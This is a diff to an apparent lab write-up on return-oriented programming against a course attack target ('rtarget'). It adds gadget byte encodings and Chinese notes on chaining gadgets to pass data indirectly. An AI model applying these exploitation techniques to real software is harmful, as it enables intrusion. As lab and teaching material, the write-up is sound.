@@ -81,9 +81,13 @@ cat exploit4.txt | ./hex2raw | ./rtarget -q
 
 ## level5
 
+```asm
 movq %rsp, %rax;   48 89 e0 
 movq %rax, %rdi;   48 89 c7
+```
 
+1. 有点陷入思维定势了，以为所有数据都得从farm里来，结果怎么算偏移量一直不知道，知道看了一点提示...
+2. 剩下的工作就是从farm里面找各种组合来达到自己要传递数据的目的；说白了就是，farm没有直接提供a->b的接口，你得绕一下，比如 a->c->d->b这样
 
 ```shell
 ./hex2raw < exploit5.txt > raw5.txt
